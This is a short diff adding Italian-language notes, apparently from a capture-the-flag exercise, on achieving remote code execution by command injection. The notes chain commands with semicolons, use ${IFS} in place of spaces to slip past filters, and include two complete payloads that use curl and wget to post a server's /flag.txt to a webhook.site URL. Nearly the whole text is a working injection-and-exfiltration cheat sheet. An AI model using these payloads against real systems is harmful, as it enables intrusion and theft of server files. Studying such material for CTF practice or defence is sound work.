@@ -1,0 +1,7 @@
+per fare rce spara comandi con ; 
+al posto degli spazi metti ${IFS}
+fai redirezionare il contenuto dal server a un tuo url ottenuto con webhook 	https://webhook.site/a1dd6dcd-324a-4ebd-9b87-334740bc4111
+per inviare dal server al tuo utl webhook usa curl o wget
+comando;curl${IFS}-X${IFS}POST${IFS}-d@/flag.txt${IFS}https://webhook.site/ade5a4ea-dacb-4eb3-84fc-23191d9df779
+comando;wget${IFS}--post-file=/flag.txt${IFS}https://webhook.site/ade5a4ea-dacb-4eb3-84fc-23191d9df779
+
